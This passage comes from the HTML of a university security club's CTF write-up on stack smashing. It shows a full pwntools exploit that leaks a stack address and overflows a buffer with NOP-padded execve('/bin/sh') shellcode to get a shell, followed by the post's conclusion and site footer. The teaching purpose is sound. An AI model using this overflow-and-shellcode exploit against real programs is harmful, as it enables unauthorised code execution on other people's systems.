+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/usr/bin/env python3</span>
+
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
+
+<span class=c1>#context.log_level = &#34;debug&#34;</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+<span class=n>pause</span><span class=p>()</span>
+<span class=n>offset</span><span class=o>=</span> <span class=mi>216</span>
+
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>/* execve /bin/sh */
+</span><span class=s2>lea rdi, [rip+binsh]
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, SYS_execve
+</span><span class=s2>syscall
+</span><span class=s2>binsh:
+</span><span class=s2>    .string &#34;/bin/sh&#34;
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;free stack address &#34;</span><span class=p>)</span>
+<span class=n>leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked stack @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span><span class=mi>130</span><span class=p>:</span> <span class=n>shellcode</span><span class=p>,</span> <span class=mi>216</span><span class=p>:</span> <span class=n>p64</span><span class=p>(</span><span class=n>leak</span><span class=p>)},</span> <span class=n>filler</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Overflow me</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We achieved code exection again. This exploit should also work on the remote host.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss7.png data-srcset="/posts/2021_stack_smashing/images/ss7.png, images/ss7.png 1.5x, /posts/2021_stack_smashing/images/ss7.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss7.png title=RCE></p>
+<h2 id=conclusion>Conclusion</h2>
+<p>That brings us to the end of another ComSec writeup. Make sure you attempt task 3, and if you found all those easy then try some of the pwn challenges on Hack The Box! As always feel free to contact me on the Discord server if you have any questions.</p>
+</div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Updated on 2021-11-04&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/8a4e5fd50279f9c110d595f8e4fdeb61f2173649 target=_blank title="commit by sharkmoos(muddy117@gmail.com) 8a4e5fd50279f9c110d595f8e4fdeb61f2173649: Update index.md">
+<i class="fas fa-hashtag fa-fw"></i>8a4e5fd</a></span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/posts/2021_stack_smashing/index.md target=_blank>Read Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/stack-smash/>stack smash</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
+</section>
+</div>
+<div class=post-nav>
+<a href=/posts/welcome_nmap/ class=next rel=next title="ComSec Introduction">ComSec Introduction<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong>
+<noscript>
+Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
+</html>
